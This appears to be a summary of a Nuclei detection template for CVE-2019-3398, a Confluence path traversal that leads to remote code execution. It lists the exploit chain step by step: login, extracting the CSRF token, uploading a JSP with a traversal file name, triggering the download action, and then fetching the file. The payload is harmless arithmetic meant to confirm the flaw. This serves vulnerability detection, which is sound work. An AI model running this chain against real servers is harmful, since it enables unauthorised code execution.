---
cve_id: CVE-2019-3398
template_path: nuclei-templates/http/cves/2019/CVE-2019-3398.yaml
affected_product: Atlassian Confluence
severity: high
authentication: required
external_callback: false
affected_versions: unknown
preconditions: [authenticated user with permission to add attachments to pages and/or blogs or to create a new space or a personal space or 'Admin' permissions for a space]
poc_classification: rce
---

## Vulnerability
Confluence Server and Data Center path traversal (CWE-22) in the `downloadallattachments` resource. Authenticated remote attacker with sufficient permissions can write arbitrary files to filesystem locations (e.g. web-root JSP pages), resulting in remote code execution.

CVSS v3.1: 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)  
Impact: arbitrary code execution on affected system.  
Remediation: apply latest Atlassian security patches.

## PoC / Detection
Classification: rce

Template executes full authenticated exploit chain to confirm RCE:  
1. POST `/dologin.action` with supplied `os_username`/`os_password` to establish session.  
2. GET `/pages/createpage.action` to extract draft ID (`ajs-draft-id`) and CSRF token (`atlassian-token`).  
3. POST `/plugins/drag-and-drop/upload.action` with `filename=../../../../../../opt/atlassian/confluence/confluence/pages/{{randstr}}.jsp` and JSP payload `${{num1}}*{{num2}}` (random integers).  
4. GET `/pages/downloadallattachments.action?pageId={{draftID}}` to trigger vulnerable resource.  
5. GET `/pages/{{randstr}}.jsp` and match computed arithmetic result in response body (`body_5`).

Successful match verifies file write + server-side JSP execution.

## References
- https://blogs.juniper.net/en-us/threat-research/cve-2019-3398-atlassian-confluence-download-attachments-remote-code-execution
- https://nvd.nist.gov/vuln/detail/CVE-2019-3398
- http://packetstormsecurity.com/files/152616/Confluence-Server-Data-Center-Path-Traversal.html
- http://packetstormsecurity.com/files/155245/Atlassian-Confluence-6.15.1-Directory-Traversal.html
- https://jira.atlassian.com/browse/CONFSERVER-58102
